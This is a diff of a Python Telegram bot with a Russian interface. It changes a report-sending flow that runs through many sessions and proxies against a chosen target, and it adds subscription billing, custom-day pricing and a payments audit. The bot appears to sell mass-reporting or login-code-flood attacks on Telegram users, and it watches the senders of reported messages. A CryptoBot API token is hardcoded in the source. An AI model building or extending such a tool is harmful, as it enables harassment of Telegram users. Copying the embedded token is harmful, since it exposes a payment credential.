-        await state.clear()
-        return
-    if data["method"] == "message":
-        try:
-            sender = await resolve_message_sender(t["entity"], t.get("msg_id"))
-            if sender and _watch_add_sender(cb.from_user.id, sender, tgt_raw):
-                log.info("watch: sender %s tracked for %s", sender, tgt_raw)
-        except Exception as e:
-            log.warning("sender watch setup failed: %s", e)
-    # ── write log txt ──
+
+    # ── write log txt (always: a failed send needs the log even more) ──
     LOGS_DIR.mkdir(exist_ok=True)
     stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     log_path = LOGS_DIR / f"report_{stamp}.txt"
@@ -7827,17 +8646,52 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
         "\u2500\u2500\u2500 \u0434\u0435\u0442\u0430\u043b\u0438 \u2500\u2500\u2500",
     ]
     for d in res["details"]:
-        mark = "✅" if d["ok"] else "❌"
-        line = f"{mark} {d['name']} | {d['proxy']}"
-        if not d["ok"] and d["err"]:
+        mark = "\u2705" if d.get("ok") else "\u274c"
+        line = f"{mark} {d.get('name', '?')} | {d.get('proxy', '-')}"
+        if not d.get("ok") and d.get("err"):
             line += f" | {d['err']}"
         log_lines.append(line)
     if data["method"] in ("code", "mail"):
         log_lines = [ln for ln in log_lines
                      if not (ln.startswith("\u041f\u0440\u0438\u0447\u0438\u043d\u0430:")
                              or ln.startswith("\u041a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439:"))]
-    log_path.write_text("\n".join(log_lines), encoding="utf-8")
+    try:
+        log_path.write_text("\n".join(log_lines), encoding="utf-8",
+                            errors="replace")
+    except Exception as e:
+        log.warning("report log write failed: %s", e)
 
+    if ok <= 0:
+        errs = [str(d.get("err") or "") for d in res["details"]
+                if not d.get("ok") and d.get("err")]
+        why = html_mod.escape(
+            (errs[0] if errs else "все сессии отказали, причина не указана")[:400])
+        try:
+            _watch_remove_one(cb.from_user.id, tgt_raw)
+        except Exception:
+            pass
+        try:
+            await safe_edit(cb.message, _cx(
+                bq(f"<b>{NAME}</b>  —  ❌ Не отправлено")
+                + "\n\n⚠️ <b>Причина:</b> <code>" + why + "</code>"
+                + f"\n\U0001f3af {report_target_html(tgt_raw, t.get('msg_id'), tgt_raw)}"
+                + "\n\nНи одна сессия не прошла — попробуй другой метод "
+                  "или повтори позже."),
+                parse_mode=ParseMode.HTML,
+                reply_markup=kb_main(cb.from_user.id))
+        except Exception as e:
+            log.warning("fail screen edit failed: %s", e)
+        await send_log_file(cb.bot, log_path, "📄 Лог отправки",
+                            cb.from_user.id, kb_main(cb.from_user.id))
+        await state.clear()
+        return
+    if data["method"] == "message":
+        try:
+            sender = await resolve_message_sender(t["entity"], t.get("msg_id"))
+            if sender and _watch_add_sender(cb.from_user.id, sender, tgt_raw):
+                log.info("watch: sender %s tracked for %s", sender, tgt_raw)
+        except Exception as e:
+            log.warning("sender watch setup failed: %s", e)
     # ── final screen ──
     head = ("\u2705 <b>\u041a\u043e\u0434\u044b \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b</b>"
             if is_code else
@@ -7863,18 +8717,25 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
         await cb.message.delete()
     except Exception:
         pass
-    await send_hero(
-        cb.message,
-        caption=_cx(text),
-        parse_mode=ParseMode.HTML,
-        reply_markup=kb_main(cb.from_user.id),
-    )
+    try:
+        await send_hero(
+            cb.message,
+            caption=_cx(text),
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb_main(cb.from_user.id),
+        )
+    except Exception as e:
+        log.warning("hero gif failed: %s", e)
+        try:
+            await cb.message.answer(_cx(text), parse_mode=ParseMode.HTML,
+                                    reply_markup=kb_main(cb.from_user.id))
+        except Exception:
+            pass
 
-    await cb.message.answer_document(
-        document=FSInputFile(log_path),
-        caption="\U0001f4c4 \u041b\u043e\u0433 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438",
-        reply_markup=kb_main(cb.from_user.id),
-    )
+    await send_log_file(
+        cb.bot, log_path,
+        "\U0001f4c4 \u041b\u043e\u0433 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438",
+        cb.from_user.id, kb_main(cb.from_user.id))
 
     if POOL_CHAT_ID:
         comment_text = c_display if c_display else "\u043d\u0435\u0442"
@@ -7922,11 +8783,11 @@ XROCKET_API = "https://pay.api.xrocket.exchange/api/v1"
 XROCKET_CURRENCY = "USDT"
 
 SUB_PLANS = {
-    "d1":   {"label": "1 \u0434\u0435\u043d\u044c",     "days": 1,   "price": 0.54},
-    "d7":   {"label": "7 \u0434\u043d\u0435\u0439",     "days": 7,   "price": 2.16},
-    "d30":  {"label": "30 \u0434\u043d\u0435\u0439",    "days": 30,  "price": 6.48},
-    "d90":  {"label": "90 \u0434\u043d\u0435\u0439",    "days": 90,  "price": 12.96},
-    "prem": {"label": "\u041f\u0440\u0435\u043c\u0438\u0443\u043c \u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430", "days": None, "price": 2.7},
+    "d1":   {"label": "1 \u0434\u0435\u043d\u044c",     "days": 1,   "price": 0.75},
+    "d7":   {"label": "7 \u0434\u043d\u0435\u0439",     "days": 7,   "price": 2.25},
+    "d30":  {"label": "30 \u0434\u043d\u0435\u0439",    "days": 30,  "price": 5.25},
+    "d90":  {"label": "90 \u0434\u043d\u0435\u0439",    "days": 90,  "price": 9.75},
+    "prem": {"label": "\u041f\u0440\u0435\u043c\u0438\u0443\u043c \u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430", "days": None, "price": 2.25},
 }
 
 # ── Cloudtips (RU cards / SBP) ───────────────────────────
@@ -7997,8 +8858,9 @@ async def ct_refresh_access() -> str | None:
                 new_rt = j.get("refresh_token") or rt
                 save_ct_session({"access": j["access_token"],
                                  "refresh": new_rt, "ts": time.time()})
-                # NOTE: ct_session.json must NOT be committed to git —
-                # it contains live tokens. Store via secrets manager only.
+                if new_rt != rt:
+                    # rotation token is a secret — never commit it to the repo
+                    log.info("cloudtips refresh token rotated (local only)")
                 _ct_tok.update(access=j["access_token"],
                                exp=time.time() + 2400)
                 return j["access_token"]
@@ -8237,11 +9099,11 @@ async def ct_poll_once(bot) -> None:
                 kb = InlineKeyboardMarkup(inline_keyboard=[
                     [InlineKeyboardButton(
                         text="✅ Выдать",
-                        icon_custom_emoji_id="5357069174512303778",
+                        icon_custom_emoji_id="5416081784641168838",
                         callback_data=f"sub:ctok:{uid_s}:{plan}")],
                     [InlineKeyboardButton(
                         text="❌ Отказ",
-                        icon_custom_emoji_id="5267123797600783095",
+                        icon_custom_emoji_id="5240241223632954241",
                         callback_data=f"sub:ctno:{uid_s}:{plan}")],
                 ])
                 try:
@@ -8324,59 +9186,6 @@ async def hb_loop(bot) -> None:
         await asyncio.sleep(HB_INTERVAL)
 
 
-DB_RECONCILE_INTERVAL = 600  # 10 минут
-
-
-async def db_reconcile_loop() -> None:
-    """
-    Периодический мерж локальных subs/users с канонической копией в store.
-
-    store.bootstrap делает это один раз при старте. Этот цикл повторяет
-    мерж каждые 10 минут — чтобы поймать расхождение при параллельных
-    воркерах, перезапусках или ручных правках через другой инстанс бота.
-
-    Алгоритм:
-      1. Тянем актуальный doc из Telegram store по file_id из индекса
-      2. merge_records(kind, local, doc) — union без потерь
-      3. Если merged != local → пишем на диск + push в store
-      4. Если merged != doc   → push обновлённой версии в store
-    """
-    await asyncio.sleep(120)  # дать bootstrap закончиться
-    while True:
-        try:
-            for kind, path in (("subs", SUBS_FILE), ("users", USERS_FILE)):
-                fid = (store._INDEX.get(kind) or {}).get("file_id")
-                if not fid:
-                    continue
-                text = await store._tg_read(kind, fid)
-                if not text:
-                    continue
-                try:
-                    doc = json.loads(text)
-                except Exception:
-                    continue
-                try:
-                    local_txt = path.read_text(encoding="utf-8")
-                    local = json.loads(local_txt)
-                except Exception:
-                    continue
-                merged = store.merge_records(kind, local, doc)
-                if merged is None:
-                    continue
-                merged_txt = json.dumps(merged, ensure_ascii=False, indent=1)
-                if merged_txt.strip() != local_txt.strip():
-                    path.write_text(merged_txt, encoding="utf-8")
-                    log.info("db_reconcile: %s merged %d local + %d store → %d",
-                             kind, len(local), len(doc), len(merged))
-                if len(merged) > len(doc):
-                    store.push_async(kind, merged_txt, force=True)
-                    log.info("db_reconcile: %s store updated from merged copy",
-                             kind)
-        except Exception as e:
-            log.error("db_reconcile_loop: %s", e)
-        await asyncio.sleep(DB_RECONCILE_INTERVAL)
-
-
 # ── beta payment methods (CryptoBot + Telegram Stars) ────
 # PAY_METHODS_ADMIN = <uid> enables pilot mode; None opens everything
 PAY_METHODS_ADMIN: int | None = None
@@ -8384,7 +9193,67 @@ CRYPTOBOT_TOKEN = (os.getenv("CRYPTOBOT_TOKEN", "").strip()
                    or "674547:AATgCUnly2uvI6zVZ4Lt6m2X47muj9Crks7")
 CRYPTOBOT_API = "https://pay.crypt.bot/api"
 # 1 Star ≈ $0.013-0.02 net — plan prices rounded up for margin
-STARS_PRICES = {"d1": 54, "d7": 162, "d30": 432, "d90": 864, "prem": 180}
+STARS_PRICES = {"d1": 75, "d7": 225, "d30": 525, "d90": 975, "prem": 225}
+
+BASE_PLAN_KEYS = ("d1", "d7", "d30", "d90", "prem")
+CUSTOM_PLANS_FILE = Path(__file__).parent / "custom_plans.json"
+
+
+def custom_plan_price(days: int) -> float:
+    """N дней: линейно между тарифами, вверх до 0.05 USDT."""
+    anchors = [(1, SUB_PLANS["d1"]["price"]),
+               (7, SUB_PLANS["d7"]["price"]),
+               (30, SUB_PLANS["d30"]["price"]),
+               (90, SUB_PLANS["d90"]["price"])]
+    if days <= anchors[0][0]:
+        return anchors[0][1]
+    for (d0, p0), (d1, p1) in zip(anchors, anchors[1:]):
+        if days <= d1:
+            if days == d1:
+                return p1
+            price = p0 + (p1 - p0) * (days - d0) / (d1 - d0)
+            return math.ceil(price * 20) / 20
+    return anchors[-1][1]
+
+
+def load_custom_plans() -> dict:
+    try:
+        d = json.loads(CUSTOM_PLANS_FILE.read_text(encoding="utf-8"))
+        return d if isinstance(d, dict) else {}
+    except Exception:
+        return {}
+
+
+def register_custom_plan(days: int) -> str:
+    """Persist an xN plan so invoices survive runner restarts."""
+    pk = f"x{days}"
+    price = custom_plan_price(days)
+    SUB_PLANS[pk] = {"label": f"{days} дн.", "days": days, "price": price}
+    STARS_PRICES[pk] = int(math.ceil(price * 100))
+    d = load_custom_plans()
+    d[pk] = {"days": days, "price": price}
+    try:
+        CUSTOM_PLANS_FILE.write_text(
+            json.dumps(d, ensure_ascii=False, indent=1), encoding="utf-8")
+    except Exception as e:
+        log.warning("custom plans save failed: %s", e)
+    return pk
+
+
+def _load_custom_plans_into_pool() -> None:
+    for pk, spec in load_custom_plans().items():
+        try:
+            days = int(spec.get("days") or 0)
+            price = float(spec.get("price") or 0)
+        except Exception:
+            continue
+        if not (1 <= days <= 90 and price > 0):
+            continue
+        SUB_PLANS[pk] = {"label": f"{days} дн.", "days": days, "price": price}
+        STARS_PRICES[pk] = int(math.ceil(price * 100))
+
+
+_load_custom_plans_into_pool()
 
 # старые инвойсы «Навсегда» (fore) уже оплачены у части людей в ссылках —
 # они гасятся как 90 дней, чтобы деньги не пропали
@@ -8481,32 +9350,13 @@ def save_subs(subs: dict) -> None:
                          encoding="utf-8")
     # grants/payments must survive runner restarts — commit the state back
     commit_file_to_repo("subs.json", "subs update", cooldown=60)
-    store.push_async("subs", SUBS_FILE.read_text(encoding="utf-8"))
-
-
-def _build_admin_set() -> set[int]:
-    """Single source of truth for admin IDs — env only, no hardcode."""
-    ids: set[int] = set()
-    if ADMIN_ID:
-        try:
-            ids.add(int(ADMIN_ID))
-        except ValueError:
-            pass
-    for raw in os.getenv("EXTRA_ADMIN_IDS", "").split(","):
-        raw = raw.strip()
-        if raw:
-            try:
-                ids.add(int(raw))
-            except ValueError:
-                pass
-    return ids
-
-
-_ADMIN_IDS: set[int] = _build_admin_set()
+    # force: a throttled push dropped the grant when two saves raced
+    store.push_async("subs", SUBS_FILE.read_text(encoding="utf-8"), force=True)
 
 
 def user_is_admin(user_id: int) -> bool:
-    return user_id in _ADMIN_IDS
+    # single source of truth: ADMIN_ID (env or the default above)
+    return bool(ADMIN_ID) and user_id == int(ADMIN_ID)
 
 
 @router.message(Command("starbalance"))
@@ -8577,12 +9427,23 @@ def commit_file_to_repo(rel_path: str, msg: str, cooldown: float = 0) -> None:
                      "commit", "-m", msg],
                     cwd=base, timeout=60, check=False, capture_output=True)
                 if r.returncode != 0:
-                    return   # nothing to commit — file unchanged
+                    # "nothing to commit" is normal; a real failure here used
+                    # to be swallowed and the grant never reached the repo
+                    staged = subprocess.run(
+                        ["git", "diff", "--cached", "--quiet"], cwd=base,
+                        timeout=30, check=False).returncode != 0
+                    if staged:
+                        log.warning("commit %s failed: %s", rel_path,
+                                    (r.stderr or b"").decode("utf-8", "replace")[:300])
+                    return
                 # Concurrent Contents-API writers keep moving main. Rebase,
                 # recover from a failed rebase, then push to an explicit ref.
+                # autostash: other data files (fsm, lolz, watchdog) are dirty
+                # in the same checkout and made every rebase refuse to start.
                 for attempt in range(8):
                     pull = subprocess.run(
-                        ["git", "pull", "--rebase", "origin", "main"],
+                        ["git", "-c", "rebase.autoStash=true", "pull",
+                         "--rebase", "origin", "main"],
                         cwd=base, timeout=90, check=False,
                         capture_output=True)
                     if pull.returncode != 0:
@@ -8636,7 +9497,7 @@ def save_users(users: dict) -> None:
     USERS_FILE.write_text(text, encoding="utf-8")
     # bindings must survive runner restarts — commit the DB back
     commit_file_to_repo("users.json", "users update", cooldown=120)
-    store.push_async("users", text)
+    store.push_async("users", text, force=True)
 
 
 def touch_user(user) -> dict:
@@ -8778,6 +9639,8 @@ def set_channel_id(cid: int) -> None:
 async def on_bot_chat_member(cm, ):
     """Auto-save the private channel id once the bot is added there."""
     chat = cm.chat
+    if getattr(cm, "new_status", "") not in ("member", "administrator", "creator"):
+        return
     if getattr(chat, "type", "") == "channel":
         if get_channel_id() != chat.id:
             set_channel_id(chat.id)
@@ -8809,8 +9672,8 @@ async def channel_gate(cb: CallbackQuery, state: FSMContext) -> bool:
         + "\n\u0432\u0441\u0442\u0443\u043f\u0430\u0439 \u2014 \u0438 \u0436\u043c\u0438 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c"
     )
     rows = [
-        [InlineKeyboardButton(text="Вступить в канал", icon_custom_emoji_id="5370546867786523009", url=SUB_CHANNEL_LINK)],
-        [InlineKeyboardButton(text="Я подписался", icon_custom_emoji_id="5357069174512303778", callback_data="menu:launch")],
+        [InlineKeyboardButton(text="Вступить в канал", icon_custom_emoji_id="5460755126761312667", url=SUB_CHANNEL_LINK)],
+        [InlineKeyboardButton(text="Я подписался", icon_custom_emoji_id="5416081784641168838", callback_data="menu:launch")],
     ]
     try:
         await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
@@ -8905,10 +9768,10 @@ async def sub_gate(cb: CallbackQuery, state: FSMContext) -> bool:
         + "\n\nДля запуска нужна подписка. Выбери способ оплаты:"
     )
     rows = [
-        [InlineKeyboardButton(text="Карта РФ / СБП (₽)", icon_custom_emoji_id="5258204546391351475", callback_data="sub:pm:ct")],
-        [InlineKeyboardButton(text="Telegram Stars", icon_custom_emoji_id="5258165702707125574", callback_data="sub:pm:xtr")],
-        [InlineKeyboardButton(text="xRocket (USDT)", icon_custom_emoji_id="5323404142809467476", callback_data="sub:pm:xr")],
-        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+        [InlineKeyboardButton(text="Карта РФ / СБП (₽)", icon_custom_emoji_id="5409048419211682843", callback_data="sub:pm:ct")],
+        [InlineKeyboardButton(text="Telegram Stars", icon_custom_emoji_id="5438496463044752972", callback_data="sub:pm:xtr")],
+        [InlineKeyboardButton(text="xRocket (USDT)", icon_custom_emoji_id="5456140674028019486", callback_data="sub:pm:xr")],
+        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
     ]
     await state.clear()
     try:
@@ -8925,10 +9788,6 @@ def activate_plan(subs: dict, user_id: int, plan_key: str) -> dict:
     if pl is None:
         log.warning("activate_plan: unknown plan %s — ignored", plan_key)
         return subs.setdefault(str(user_id), {})
-    # для юзеров из _PREM_REQUIRES_BASE премиум только как дополнение
-    if plan_key == "prem" and user_id in _PREM_REQUIRES_BASE:
-        if not _has_base_sub(subs, user_id):
-            raise ValueError("premium_requires_base")
     rec = subs.setdefault(str(user_id), {})
     if plan_key == "prem":
         rec["premium"] = True
@@ -8943,6 +9802,133 @@ def activate_plan(subs: dict, user_id: int, plan_key: str) -> dict:
     return rec
 
 
+# ── subscriptions audit ─────────────────────────────────
+def _fmt_until(ts: float) -> str:
+    return datetime.fromtimestamp(ts).strftime("%d.%m.%Y %H:%M") if ts else "—"
+
+
+def sub_expected_until(plan: str, ts: float) -> float:
+    """Expiry a paid order of `plan` bought at `ts` must produce."""
+    pl = SUB_PLANS.get(plan_key(plan))
+    if not pl or pl["days"] is None:
+        return 0.0
+    return float(ts) + float(pl["days"]) * 86400
+
+
+async def subs_audit(repair: bool = True) -> list[str]:
+    """Reconcile subs.json with the Telegram store doc and the paid ledger.
+
+    Three recovery layers, each one keeps the larger value — an entry is
+    never shortened, so an expired-but-replayed order cannot revive a term:
+      1. store doc records missing from the repo copy;
+      2. store doc term longer than the local one;
+      3. paid star orders whose days never landed (grant loop died between
+         activate_plan() and the store push).
+    Returns human-readable fix lines; writes nothing when repair is False.
+    """
+    subs = load_subs()
+    fixes: list[str] = []
+
+    fid = (store._INDEX.get("subs") or {}).get("file_id")
+    doc: dict = {}
+    if fid:
+        try:
+            txt = await store._tg_read("subs", fid)
+            if txt:
+                doc = json.loads(txt) or {}
+        except Exception as e:
+            log.warning("subs_audit: store read %s", e)
+    for uid_s, rec in doc.items():
+        if not isinstance(rec, dict):
+            continue
+        cur = subs.get(uid_s)
+        if cur is None:
+            subs[uid_s] = dict(rec)
+            fixes.append(
+                f"сторе → файл: <code>{uid_s}</code> · "
+                + ("навсегда" if rec.get("forever")
+                   else _fmt_until(float(rec.get("until") or 0))))
+            continue
+        until_doc = float(rec.get("until") or 0)
+        until_cur = float(cur.get("until") or 0)
+        if until_doc > until_cur + 60:
+            cur["until"] = until_doc
+            fixes.append(f"срок из стора: <code>{uid_s}</code> → {_fmt_until(until_doc)}")
+        if rec.get("forever") and not cur.get("forever"):
+            cur["forever"] = True
+            fixes.append(f"«навсегда» из стора: <code>{uid_s}</code>")
+        if rec.get("premium") and not cur.get("premium"):
+            cur["premium"] = True
+            fixes.append(f"premium из стора: <code>{uid_s}</code>")
+
+    try:
+        orders = await star_orders_read()
+    except Exception as e:
+        log.warning("subs_audit: orders %s", e)
+        orders = []
+    now = time.time()
+    for o in orders:
+        if not isinstance(o, dict):
+            continue
+        try:
+            uid = str(int(o.get("uid") or 0))
+            pk = plan_key(str(o.get("plan") or ""))
+            ts = float(o.get("ts") or 0)
+        except Exception:
+            continue
+        if uid == "0" or not ts:
+            continue
+        rec = subs.setdefault(uid, {})
+        stars = int(o.get("amount") or 0)
+        if pk == "prem":
+            if not rec.get("premium") or not rec.get("forever"):
+                rec["premium"] = True
+                rec["forever"] = True
+                fixes.append(f"премиум по оплате ({stars}⭐): <code>{uid}</code>")
+            continue
+        exp = sub_expected_until(pk, ts)
+        cur_until = float(rec.get("until") or 0)
+        if exp > cur_until + 1:
+            rec["until"] = exp
+            tail = "" if exp > now else " (уже истёк)"
+            fixes.append(f"оплата {pk} ({stars}⭐): <code>{uid}</code> → "
+                         f"{_fmt_until(exp)}{tail}")
+
+    if fixes and repair:
+        save_subs(subs)
+        persist_now("subs", f"subs audit: {len(fixes)} fixes")
+        log.info("subs_audit: %d fixes applied", len(fixes))
+    return fixes
+
+
+@router.message(Command("subsaudit"))
+async def cmd_subs_audit(msg: Message):
+    if not (msg.from_user and user_is_admin(msg.from_user.id)):
+        return
+    note = await msg.answer(_cx("🩺 сверяю файл · стор · оплаты…"),
+                            parse_mode=ParseMode.HTML)
+    try:
+        fixes = await subs_audit(repair=True)
+    except Exception as e:
+        await note.edit_text(_cx(f"🔴 аудит упал: <code>{html_mod.escape(str(e))}</code>"),
+                             parse_mode=ParseMode.HTML)
+        return
+    subs = load_subs()
+    now = time.time()
+    act = sum(1 for r in subs.values() if isinstance(r, dict)
+              and (r.get("forever") or float(r.get("until") or 0) > now))
+    head = (bq(f"<b>{NAME}</b>  ·  🩺 Аудит подписок")
+            + f"\n\n📦 записей: <b>{len(subs)}</b> · активных: <b>{act}</b>")
+    body = ("\n\n" + "\n".join("• " + x for x in fixes[:40])
+            if fixes else "\n\nвсё сходится, потерь нет")
+    foot = (f"\n\n🟢 Успешно: {len(fixes)}"
+            f"\n🔴 Ошибки: 0")
+    try:
+        await note.edit_text(_cx(head + body + foot), parse_mode=ParseMode.HTML)
+    except Exception:
+        await msg.answer(_cx(head + body + foot), parse_mode=ParseMode.HTML)
+
+
 # ── subscriptions UI ────────────────────────────────────
 @router.callback_query(F.data == "sub:shop")
 async def sub_shop(cb: CallbackQuery, state: FSMContext):
@@ -8955,10 +9941,10 @@ async def sub_shop(cb: CallbackQuery, state: FSMContext):
         + "\n\nВыбери способ оплаты:"
     )
     rows = [
-        [InlineKeyboardButton(text="Карта РФ / СБП (₽)", icon_custom_emoji_id="5258204546391351475", callback_data="sub:pm:ct")],
-        [InlineKeyboardButton(text="Telegram Stars", icon_custom_emoji_id="5258165702707125574", callback_data="sub:pm:xtr")],
-        [InlineKeyboardButton(text="xRocket (USDT)", icon_custom_emoji_id="5323404142809467476", callback_data="sub:pm:xr")],
-        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+        [InlineKeyboardButton(text="Карта РФ / СБП (₽)", icon_custom_emoji_id="5409048419211682843", callback_data="sub:pm:ct")],
+        [InlineKeyboardButton(text="Telegram Stars", icon_custom_emoji_id="5438496463044752972", callback_data="sub:pm:xtr")],
+        [InlineKeyboardButton(text="xRocket (USDT)", icon_custom_emoji_id="5456140674028019486", callback_data="sub:pm:xr")],
+        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
     ]
     await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
                                   reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
@@ -8977,21 +9963,17 @@ async def sub_paymethod(cb: CallbackQuery, state: FSMContext):
         await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
         return
     m = cb.data.rsplit(":", 1)[1]
-    _plans = _visible_plans(cb.from_user.id, load_subs())
-    _prem_hidden = cb.from_user.id in _PREM_REQUIRES_BASE and \
-                   not _has_base_sub(load_subs(), cb.from_user.id)
-    _prem_note = ("\n\n⚠️ <i>Премиум доступен только при активной базовой подписке.</i>"
-                  if _prem_hidden else "")
     if m == "xtr":
         caption = (
             bq(f"<b>{NAME}</b>  —  ⭐ Telegram Stars")
             + "\n\nТарифы:"
         )
-        for pk, pl in _plans:
+        for pk in BASE_PLAN_KEYS:
+            pl = SUB_PLANS[pk]
             caption += f"\n• <b>{pl['label']}</b> — <b>{STARS_PRICES[pk]} ⭐</b>"
-        caption += _prem_note
         rows = []
-        for pk, pl in _plans:
+        for pk in BASE_PLAN_KEYS:
+            pl = SUB_PLANS[pk]
             link = await arch_star_link(pk, cb.from_user.id)
             rows.append([InlineKeyboardButton(
                 text=f"⭐ {pl['label']} — {STARS_PRICES[pk]}",
@@ -9001,29 +9983,100 @@ async def sub_paymethod(cb: CallbackQuery, state: FSMContext):
             bq(f"<b>{NAME}</b>  —  💳 Карта РФ / СБП")
             + "\n\nОплата рублями через Cloudtips: карта любого банка РФ или СБП.\nТарифы:"
         )
-        for pk, pl in _plans:
+        for pk in BASE_PLAN_KEYS:
+            pl = SUB_PLANS[pk]
             caption += f"\n• <b>{pl['label']}</b> — <b>{ct_price_rub(pk):.0f} ₽</b>"
-        caption += _prem_note
         rows = [[InlineKeyboardButton(
-                    text=f"💰 {pl['label']} — {ct_price_rub(pk):.0f} ₽",
+                    text=f"💰 {SUB_PLANS[pk]['label']} — "
+                         f"{ct_price_rub(pk):.0f} ₽",
                     callback_data=f"sub:buy:ct:{pk}")]
-                for pk, pl in _plans]
+                for pk in BASE_PLAN_KEYS]
     else:
         caption = (
             bq(f"<b>{NAME}</b>  —  🚀 xRocket")
             + "\n\nИнвойс в USDT через @xrocket.\nТарифы:"
         )
-        for pk, pl in _plans:
+        for pk in BASE_PLAN_KEYS:
+            pl = SUB_PLANS[pk]
             caption += f"\n• <b>{pl['label']}</b> — <b>{pl['price']:g} USDT</b>"
-        caption += _prem_note
         rows = [[InlineKeyboardButton(
-                    text=f"💰 {pl['label']} — {pl['price']:g} USDT",
+                    text=f"💰 {SUB_PLANS[pk]['label']} — "
+                         f"{SUB_PLANS[pk]['price']:g} USDT",
                     callback_data=f"sub:buy:xrocket:{pk}")]
-                for pk, pl in _plans]
-    rows.append([InlineKeyboardButton(text="К способам", icon_custom_emoji_id="5258132936401624790", callback_data="sub:shop")])
+                for pk in BASE_PLAN_KEYS]
+    rows.append([InlineKeyboardButton(
+        text="🗓 Свои дни (1–90)", callback_data=f"sub:cdays:{m}")])
+    rows.append([InlineKeyboardButton(text="К способам", icon_custom_emoji_id="5416041192905265756", callback_data="sub:shop")])
     await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
                                   reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
     await cb.answer()
+
+
+@router.callback_query(F.data.startswith("sub:cdays:"))
+async def sub_custom_start(cb: CallbackQuery, state: FSMContext):
+    m = cb.data.rsplit(":", 1)[1]
+    if m not in ("xtr", "ct", "xr"):
+        await cb.answer("❌", show_alert=True)
+        return
+    await state.update_data(custom_pay=m)
+    await state.set_state(SubCustom.days)
+    await cb.message.edit_caption(
+        caption=_cx(bq(f"<b>{NAME}</b>  —  🗓 Свои дни")
+                    + "\n\nПришли число дней подписки: <b>1–90</b>."
+                    + "\nЦена посчитается по тарифу и округлится вверх."),
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Назад",
+                                  icon_custom_emoji_id="5416041192905265756",
+                                  callback_data=f"sub:pm:{m}")]]))
+    await cb.answer()
+
+
+@router.message(SubCustom.days)
+async def sub_custom_days(msg: Message, state: FSMContext):
+    txt = (msg.text or "").strip()
+    if not txt.isdigit() or not (1 <= int(txt) <= 90):
+        await msg.answer(_cx("❌ Нужно целое число дней от <b>1</b> до <b>90</b>."),
+                         parse_mode=ParseMode.HTML)
+        return
+    n = int(txt)
+    m = (await state.get_data()).get("custom_pay") or "xr"
+    pk = register_custom_plan(n)
+    pl = SUB_PLANS[pk]
+    try:
+        await _persist_paths([CUSTOM_PLANS_FILE.name],
+                             f"custom plan {pk}: {pl['price']:g} USDT")
+    except Exception as e:
+        log.warning("custom plan persist failed: %s", e)
+    await state.clear()
+    if m == "xtr":
+        price_line = f"{STARS_PRICES[pk]} ⭐"
+        link = await arch_star_link(pk, msg.from_user.id)
+        if not link:
+            await msg.answer(_cx("⚠️ Звёзды сейчас недоступны — выбери другой "
+                                 "способ оплаты."), parse_mode=ParseMode.HTML)
+            return
+        rows = [[InlineKeyboardButton(
+            text=f"⭐ Оплатить {STARS_PRICES[pk]} ⭐", url=link)]]
+    elif m == "ct":
+        price_line = f"{ct_price_rub(pk):.0f} ₽"
+        rows = [[InlineKeyboardButton(
+            text=f"💳 Оплатить {ct_price_rub(pk):.0f} ₽",
+            callback_data=f"sub:buy:ct:{pk}")]]
+    else:
+        price_line = f"{pl['price']:g} USDT"
+        rows = [[InlineKeyboardButton(
+            text=f"🚀 Оплатить {pl['price']:g} USDT",
+            callback_data=f"sub:buy:xrocket:{pk}")]]
+    rows.append([InlineKeyboardButton(
+        text="Назад", icon_custom_emoji_id="5416041192905265756",
+        callback_data=f"sub:pm:{m}")])
+    await msg.answer(_cx(
+        bq(f"<b>{NAME}</b>  —  🗓 {n} дн.")
+        + f"\n\n💳 <b>{pl['label']}</b> — <b>{price_line}</b>"
+        + "\nПодписка включится автоматически после оплаты."),
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
 
 
 @router.callback_query(F.data.startswith("sub:buy:"))
@@ -9090,21 +10143,21 @@ async def sub_buy(cb: CallbackQuery, state: FSMContext):
         if sbp_url:
             pay_btn = [InlineKeyboardButton(
                 text=f"Оплатить через СБП {amount} ₽",
-                icon_custom_emoji_id="5258204546391351475",
+                icon_custom_emoji_id="5409048419211682843",
                 url=sbp_url)]
         else:
             pay_btn = [InlineKeyboardButton(
                 text=f"Оплатить {amount} ₽",
-                icon_custom_emoji_id="5258204546391351475",
+                icon_custom_emoji_id="5409048419211682843",
                 url=pay_url)]
         rows = [pay_btn,
                 [InlineKeyboardButton(
                     text="Я оплатил",
-                    icon_custom_emoji_id="5357069174512303778",
+                    icon_custom_emoji_id="5416081784641168838",
                     callback_data=f"sub:ctpaid:{pk}")],
                 [InlineKeyboardButton(
                     text="Назад",
-                    icon_custom_emoji_id="5258132936401624790",
+                    icon_custom_emoji_id="5416041192905265756",
                     callback_data="sub:pm:ct")]]
         await cb.message.edit_caption(
             caption=_cx(caption), parse_mode=ParseMode.HTML,
@@ -9146,9 +10199,9 @@ async def sub_buy(cb: CallbackQuery, state: FSMContext):
     await cb.message.edit_caption(
         caption=_cx(caption), parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Оплатить", icon_custom_emoji_id="5258204546391351475", url=pay_url)],
